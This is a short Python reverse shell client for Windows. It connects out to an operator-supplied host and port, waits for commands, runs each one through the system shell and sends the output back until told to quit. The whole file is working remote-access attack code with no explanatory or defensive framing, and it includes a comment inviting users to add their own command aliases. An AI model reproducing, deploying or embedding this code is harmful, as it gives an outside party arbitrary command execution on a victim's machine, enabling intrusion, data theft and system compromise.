import os
import random
import socket
import string
import subprocess
import sys

if os.name != 'nt':
    exit()
username = os.getenv("username")
HOST = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0' # Change this to your public ip 
PORT = int(sys.argv[2] if len(sys.argv) > 2 else 5555) 
print('Please wait while we establish a connection...')
s = socket.socket()
s.connect((HOST, PORT))
msg = s.recv(1024).decode()
print('[*] server:', msg)
print('Connection established')
while True:
    cmd = s.recv(1024).decode()
    # print(f'[*] receive {cmd}')
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break
        
    # To add your own command remove the # below and change alias with the command alias and command with the command name

    # if cmd.lower() in ['alias', 'command']:   
        # put you code here

    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    if len(result) == 0:
        result = 'OK'.encode()

    s.send(result)

s.close()
